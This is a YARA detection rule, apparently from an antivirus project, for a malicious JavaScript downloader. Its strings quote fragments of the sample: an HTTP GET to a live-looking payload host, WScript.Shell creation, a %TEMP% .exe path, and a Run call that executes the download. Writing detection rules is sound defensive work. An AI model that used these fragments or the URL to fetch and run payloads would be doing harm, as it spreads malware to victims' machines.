rule sig_20160330_747d869ce98d7c0c60fdd02b13ab4eb4 {
  meta:
    description = "datamaliciousorder - file 20160330_747d869ce98d7c0c60fdd02b13ab4eb4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "45bdbc7cea427a6e0b2a26e2a66c8d710491ce97a984140fbf42b47ba5672336"

  strings:
    $s1  = "N2[P](\"GET\", \"http://pure-line.com.pl/f6splw\", false);" fullword ascii
    $s2  = "var CI0 = function OX() {return WScript[L](\"WScript\"+\".Shell\");}(), EK = 11;" fullword ascii
    $s3  = "function F0(H0, X0){U = U * 1; return H0 - X0;};" fullword ascii
    $s4  = "if (N2[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function W() {return CI0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8MolroCz.ex\" + \"e\";};" fullword ascii
    $s6  = "function CI(){return ST + \"\";};" fullword ascii
    $s7  = "function G() {return ((X == true) && (X == N1)) ? 1 : U;};" fullword ascii
    $s8  = "function N(T){CI0[\"Run\"](T, U, U);};" fullword ascii
    $s9  = "function K(){return 22;};" fullword ascii
    $s10 = "var H = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (LQ);" fullword ascii
    $s12 = "return F0(WM, Y);" fullword ascii
    $s13 = "function OJ()" fullword ascii
    $s14 = "function F(Q) {var C = (1, 2, 3, 4, 5, Q); return C;};" fullword ascii
    $s15 = "function S(){return L;};" fullword ascii
    $s16 = "var N1 = false;" fullword ascii
    $s17 = "N1 = true; " fullword ascii
    $s18 = "var PE = false;" fullword ascii
    $s19 = "} catch(FR){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}